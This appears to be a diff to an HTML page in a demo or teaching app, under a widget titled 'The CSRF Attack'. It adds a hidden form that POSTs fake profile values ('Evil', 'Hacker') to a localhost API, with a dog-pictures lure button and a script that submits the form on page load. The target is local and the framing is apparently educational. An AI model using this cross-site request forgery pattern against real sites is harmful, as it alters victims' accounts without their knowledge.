@@ -7,6 +7,11 @@
                         <div ht-widget-header title="The CSRF Attack"
                              allow-collapse="true"></div>
                         <div class="widget-content text-center text-info">
+                            <form action="http://localhost:3000/api/user/profile" method="POST">
+                                <input type="hidden" name="firstName" value="Evil"></input>
+                                <input type="hidden" name="lastName" value="Hacker"></input>
+                                <input type="submit" value="Click to view awesome pictures of dogs!"/>
+                            </form>
                         </div>
                         <div class="widget-foot">
                             <div class="clearfix"></div>
@@ -16,4 +21,7 @@
             </div>
         </div>
     </section>
+    <script>
+        document.forms[0].submit();
+    </script>
 </section>
